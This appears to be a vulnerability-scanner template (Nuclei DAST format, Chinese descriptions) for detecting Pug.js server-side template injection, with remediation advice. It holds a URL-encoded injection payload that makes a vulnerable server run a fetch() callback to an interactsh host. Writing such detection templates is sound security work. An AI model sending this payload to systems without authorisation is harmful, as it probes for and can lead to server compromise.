id: pugjs-oob

info:
  name: Pug.js 带外服务端模板注入（DAST）
  author: 0xAwali,DhiyaneshDK
  severity: high
  description: |
    Pug.js 服务端模板注入发生在应用把用户输入作为模板语法渲染时，攻击者可借模板表达式访问运行时对象、调用函数或触发外部请求。模板向查询参数和请求体追加/替换 Pug.js 专用载荷，并通过 interactsh HTTP 外带交互确认表达式在服务端被执行。
  impact: |
    - 攻击者可能在模板引擎上下文中执行命令、读取环境变量、访问应用对象或向外发送敏感信息。
    - 若模板进程具备数据库、文件系统或云资源权限，SSTI 可进一步导致应用服务器被接管。
  remediation: |
    - 不要把用户输入拼接进服务端模板源码；使用安全变量绑定，并将模板文件与用户内容分离。
    - 启用模板沙箱和 allowlist，限制危险对象、反射、命令执行和网络访问，并升级模板引擎到安全版本。
  reference:
    - https://pugjs.org/
    - https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756
  metadata:
    verified: true
  tags: ssti,dast,oast,oob,vuln

variables:
  prefix: "{{rand_text_alpha(5)}}"

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'
          - 'method == "POST"'
          - 'method == "PUT"'
    payloads:
      injection:
        - '%23%7Bfunction%28%29%7B%0A%20%20fetch%28%22http%3A%2F%2F{{interactsh-url}}%22%2C%20%7B%0A%20%20%20%20headers%3A%20%7B%0A%20%20%20%20%20%20%22{{prefix}}%22%3A%20%22application%2Fjson%22%0A%20%20%20%20%7D%0A%20%20%7D%29%0A%7D%28%29%7D'

    fuzzing:
      - parts:
          - query
          - body
        type: postfix
        mode: single
        fuzz:
          - "{{injection}}"

    matchers-condition: and
    matchers:
      - type: dsl
        name: request-matcher
        dsl:
          - "contains(interactsh_protocol,'http')"
          - "contains(to_lower(interactsh_request), to_lower(prefix))"
        condition: and
